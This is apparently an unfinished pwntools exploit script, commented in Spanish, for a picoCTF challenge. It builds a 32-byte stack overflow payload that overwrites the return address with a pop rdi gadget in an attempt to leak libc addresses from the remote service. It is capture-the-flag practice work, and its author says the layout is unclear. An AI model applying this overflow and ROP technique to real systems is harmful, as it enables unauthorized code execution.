#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

HOST = 'shape-facility.picoctf.net'
PORT = 49954

puts_plt = 0x4010a0
pop_rdi = 0x4014b3
puts_got = 0x404018
vuln_addr = 0x401229

log.info("Intentando leak simple de libc")

io = remote(HOST, PORT)

# Agregar entrada
io.sendlineafter(b'Exit the app\n', b'1')
io.sendlineafter(b'name: \n', b'test')

# Construir payload
# Feedback overflow permite 32 bytes desde rbp-12
# Estructura:
# [0-7]: feedback
# [8-11]: total_entries  
# [12-19]: saved_rbp (será corrupto, no importa mucho)
# [20-27]: return_address
# [28-31]: 4 bytes extra

# Después del return de vuln(), rsp = viejo_rbp + 8
# Mi return_address está en viejo_rbp + 8
# El siguiente qword (rbp+16) está fuera de mi control con solo 32 bytes

# Pero wait... cuando returno, saved_rbp fue popped, así que rbp tiene mi valor corrupto
# Y rsp = viejo_rbp + 16 (después del pop rbp; ret)

# Hmm, esto es confuso. Déjame intentar simplemente poner gadgets y ver qué pasa.

# Payload: usar los 32 bytes completos
payload = flat({
    0: b'A' * 8,           # feedback
    8: p32(0x41414141),    # total_entries (junk)
    12: p64(0x4242424242424242),  # saved_rbp (junk, será el nuevo rbp)
    20: p64(pop_rdi),      # return address
    28: p32(0x43434343),   # 4 bytes extra
}, filler=b'\x00')

assert len(payload) <= 32

io.sendlineafter(b'Exit the app\n', b'3')
io.sendlineafter(b'appreciate it: \n', payload)

# Ver qué pasa
try:
    output = io.recvall(timeout=2)
    log.info(f"Output: {output}")
    
    # Buscar leak
    if len(output) > 0:
        log.success(f"Recibí {len(output)} bytes")
        log.info(f"Hex: {output.hex()}")
except Exception as e:
    log.error(f"Error: {e}")

io.close()

log.info("Test completado. Analizando resultados...")
